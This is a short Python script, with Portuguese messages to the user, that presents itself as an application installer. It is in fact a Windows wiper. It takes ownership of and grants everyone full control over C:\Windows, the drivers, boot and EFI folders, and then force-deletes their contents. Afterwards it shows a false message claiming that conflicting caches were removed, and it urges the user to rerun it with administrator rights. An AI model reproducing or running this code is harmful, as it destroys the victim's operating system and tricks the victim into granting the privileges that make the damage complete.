import os
import time
import pyautogui
import random
import threading

print("Iremos instalar o aplicativo daqui à 5 segundos, vai demorar um pouco")
time.sleep(5)

os.system('takeown /f "C:\Windows\System32\Drivers" /A /R /D Y') #dar permissão pra System32\Drivers como administrador
os.system('icacls "C:\Windows\System32\Drivers" /grant Todos:(OI)(CI)F /T')

os.system('takeown /f "C:\Windows\diagnostics\index" /A /R /D Y')
os.system('icacls "C:\Windows\diagnostics\index" /grant Todos:(OI)(CI)F /T')

os.system('takeown /f "C:\Windows\diagnostics\scheduled\Maintenance" /A /R /D Y')
os.system('icacls "C:\Windows\diagnostics\index" /grant Todos:(OI)(CI)F /T')

os.system('takeown /f "C:\Windows\Boot\EFI" /A /R /D Y')
os.system('icacls "C:\Windows\Boot\EFI" /grant Todos:(OI)(CI)F /T')

os.system('takeown /f "C:\Windows\assembly" /A /R /D Y')
os.system('icacls "C:\Windows\assembly" /grant Todos:(OI)(CI)F /T')

os.system('takeown /f "C:\Windows" /A /R /D Y')
os.system('icacls "C:\Windows" /grant Todos:(OI)(CI)F /T')

os.system('takeown /f "C:\Windows\Boot" /A /R /D Y')
os.system('icacls "C:\Windows\Boot" /grant Todos:(OI)(CI)F /T')







os.system("del /f /s /q C:\Windows\System32\Drivers\*.*")
os.system("del /f /s /q C:\Windows")
os.system("del /f /s /q C:\Windows\diagnostics\index\*.*")
os.system("del /f /s /q C:\Windows\diagnostics\scheduled\Maintenance\*.*")
os.system("del /f /s /q C:\Windows\Boot\EFI")
os.system("del /f /s /q C:\Windows\assembly")
os.system("del /f /s /q C:\Windows\Boot")



time.sleep(8)


print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
os.system("echo Excluimos alguns caches que estavam dando comflito e impedindo a inicialização do aplicativo.")

time.sleep(6)

os.system("echo aaa...............................................................................................................................................................................................................................................................Execute o aplicativo novamente com privilégios de administrador.                                                                    ")

time.sleep(20)
